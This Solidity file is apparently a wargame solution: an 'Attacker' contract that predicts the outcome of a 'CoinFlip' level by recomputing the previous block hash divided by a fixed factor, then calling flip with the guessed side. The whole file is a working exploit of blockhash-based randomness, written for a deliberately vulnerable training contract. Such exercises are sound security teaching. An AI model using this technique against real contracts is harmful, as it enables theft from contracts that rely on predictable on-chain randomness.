// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/level03.sol";

contract Attacker
{
    uint256 lastHash;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    CoinFlip level;
    constructor(address _level)
    {
        level = CoinFlip(_level);
    }

    function exploit() external 
    {
            uint256 blockValue = uint256(blockhash(block.number - 1));
            if (lastHash == blockValue) {
            revert();
            }

            lastHash = blockValue;
            uint256 coinFlip = blockValue / FACTOR;
            bool side = coinFlip == 1 ? true : false;

            if (side == true)
            {
                level.flip(true);
            }
            else
            {
                level.flip(false);
            }
        }   
}